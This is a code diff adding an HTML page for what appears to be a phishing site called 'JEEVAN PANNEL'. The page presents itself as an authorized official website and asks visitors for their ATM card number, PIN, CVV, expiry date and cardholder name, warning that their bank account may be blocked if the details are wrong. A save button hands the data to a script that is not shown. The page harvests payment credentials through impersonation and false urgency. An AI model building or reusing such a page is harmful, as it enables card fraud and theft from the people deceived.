@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATM Details - JEEVAN PANNEL</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+<header>
+    <div class="header-center">
+        <span class="logo"></span>
+        <span class="header-title">JEEVAN PANNEL<br><small>AUTHORIZED OFFICIAL JEEVAN PANNEL WEBSITE</small></span>
+    </div>
+</header>
+
+<div class="card">
+    <div class="title">AUTHENTICATE ATM DETAILS</div>
+
+    <div class="info-box" style="margin-bottom: 20px;">
+        <p><i class="fas fa-info-circle"></i> <strong>PLEASE ENTER THE CORRECT ATM DETAILS</strong></p>
+        <p><i class="fas fa-exclamation-triangle" style="color: #f44336;"></i> <strong style="color: #f44336;">IF DETAILS ARE INCORRECT,YOUR BANK ACCOUNT MAY BE BLOCKED</strong></p>
+    </div>
+
+    <input class="input" id="atmCardNumber" placeholder="ENTER ATM CARD NUMBER" maxlength="16">
+    <input class="input" id="atmPin" placeholder="ATM PIN" type="password" maxlength="4">
+    <input class="input" id="atmCvv" placeholder="ATM CVV" type="password" maxlength="3">
+    <input class="input" id="atmExpiry" placeholder="ATM EXPIRY MM/YY">
+    <input class="input" id="cardHolderName" placeholder="CARD HOLDER NAME">
+
+    <button class="btn" id="saveAtmBtn">SAVE DETAILS</button>
+    <button class="btn btn-back" onclick="window.history.back();">BACK</button>
+</div>
+
+<div class="footer">
+    <div class="footer-item" data-page="profile"><i class="fas fa-user"></i> MY PROFILE</div>
+    <div class="footer-item" data-page="account"><i class="fas fa-wallet"></i> MY ACCOUNT</div>
+    <div class="footer-item" data-page="support"><i class="fas fa-headset"></i> CUSTOMER SUPPORT</div>
+    <div class="footer-item" data-page="bonus"><i class="fas fa-gift"></i> BONUS</div>
+</div>
+
+<script src="js/main.js"></script>
+</body>
+</html>
